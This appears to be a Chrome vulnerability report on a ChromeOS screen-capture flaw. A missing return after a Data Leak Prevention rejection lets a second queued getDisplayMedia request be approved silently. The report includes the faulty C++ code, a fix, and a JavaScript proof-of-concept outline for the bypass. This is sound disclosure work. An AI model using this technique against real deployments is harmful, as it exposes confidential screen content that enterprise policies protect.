# Chrome VRP Report: DisplayMediaAccessHandler DLP Bypass via Missing Return Statement

## Summary

`DisplayMediaAccessHandler::OnDlpRestrictionChecked()` in `chrome/browser/media/webrtc/display_media_access_handler.cc` is missing a `return` statement after rejecting a DLP-prohibited screen capture request. When two `getDisplayMedia()` requests are queued from the same tab, the first request's DLP rejection causes the second request to be auto-approved with the DLP-denied `media_id`, bypassing ChromeOS Data Leak Prevention policy entirely.

## Affected Component

`chrome/browser/media/webrtc/display_media_access_handler.cc` (ChromeOS build only)

## Chromium Version

Tested against Chromium HEAD as of 2026-04-27.

## Vulnerability Details

### The Bug

```cpp
// display_media_access_handler.cc:778-795
#if BUILDFLAG(IS_CHROMEOS)
void DisplayMediaAccessHandler::OnDlpRestrictionChecked(
    base::WeakPtr<WebContents> web_contents,
    const DesktopMediaID& media_id,
    bool is_dlp_allowed) {
  DCHECK_CURRENTLY_ON(content::BrowserThread::UI);

  if (!web_contents) {
    return;
  }

  if (!is_dlp_allowed) {
    RejectRequest(web_contents.get(),
                  MediaStreamRequestResult::DLP_PERMISSION_DENIED);
  }
  AcceptRequest(web_contents.get(), media_id);  // BUG: Always runs
}
#endif
```

When `is_dlp_allowed` is `false`, `RejectRequest()` is called but execution falls through to `AcceptRequest()` on line 793.

### Why This Is Exploitable

The key is the request queue behavior:

1. `RejectRequest()` (line 619-639) pops the front request from the queue and, if the queue is not empty, calls `ProcessQueuedAccessRequest()` to start processing the next request.

2. `AcceptRequest()` (line 641-) takes the current front of the queue and approves it with the given `media_id`.

When two requests are queued:
- `RejectRequest()` removes request #1 and starts processing request #2
- `AcceptRequest()` immediately takes request #2 (now at the front) and approves it with the DLP-denied `media_id`

### Attack Scenario

1. On a ChromeOS device with DLP policies protecting sensitive tab content
2. Attacker's web page calls `navigator.mediaDevices.getDisplayMedia()` twice in quick succession
3. First request shows the media picker — user selects a DLP-protected tab
4. DLP check runs and correctly rejects the capture
5. **But**: The second queued request is auto-approved with the same DLP-protected target, without any media picker dialog or DLP check
6. Attacker captures the DLP-protected screen content

### Impact

- Bypasses ChromeOS enterprise DLP (Data Leak Prevention) policies for screen capture
- Captured content may include confidential documents, emails, or other DLP-protected information
- The second capture starts without any user-visible permission dialog
- Affects any ChromeOS enterprise deployment using DLP screen sharing restrictions

## Suggested Fix

```cpp
if (!is_dlp_allowed) {
    RejectRequest(web_contents.get(),
                  MediaStreamRequestResult::DLP_PERMISSION_DENIED);
    return;  // Add missing return
}
AcceptRequest(web_contents.get(), media_id);
```

## PoC Outline

```javascript
// On ChromeOS with DLP policies active
// From attacker page:

// Request 1: Will be shown in picker, user selects DLP-protected tab
const promise1 = navigator.mediaDevices.getDisplayMedia({video: true});

// Request 2: Queued behind request 1
const promise2 = navigator.mediaDevices.getDisplayMedia({video: true});

// When DLP rejects request 1:
// - promise1 rejects with DLP_PERMISSION_DENIED
// - promise2 resolves with the DLP-protected target stream!
promise1.catch(e => console.log("Request 1 rejected (expected):", e));
promise2.then(stream => {
    console.log("Request 2 APPROVED with DLP-denied target!");
    // Can now capture DLP-protected content
    const video = document.createElement('video');
    video.srcObject = stream;
    video.play();
});
```

Note: Actual PoC requires a ChromeOS device with DLP policies configured.

## Platform Limitation

This bug is only present in ChromeOS builds (`#if BUILDFLAG(IS_CHROMEOS)`). Desktop Chrome does not have DLP integration in this path.
